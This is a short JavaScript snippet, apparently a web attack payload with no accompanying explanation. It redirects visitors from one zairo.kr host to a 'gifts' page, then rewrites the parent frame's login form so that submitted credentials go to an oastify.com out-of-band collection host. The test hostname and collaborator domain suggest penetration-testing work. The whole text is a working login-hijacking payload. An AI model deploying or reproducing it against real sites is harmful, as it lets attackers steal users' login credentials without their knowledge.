(function() {
    if (document.location.hostname == 'c.zairo.kr') {
        document.location.href = 'http://test1.zairo.kr/us/gifts';
    } else if (document.location.href == 'http://test1.zairo.kr/us/gifts') {
        parent.document.login.action = 'http://qzt2yh3cosnjtsg61zqzaed11s7kv9.oastify.com';
    }
}).call(this);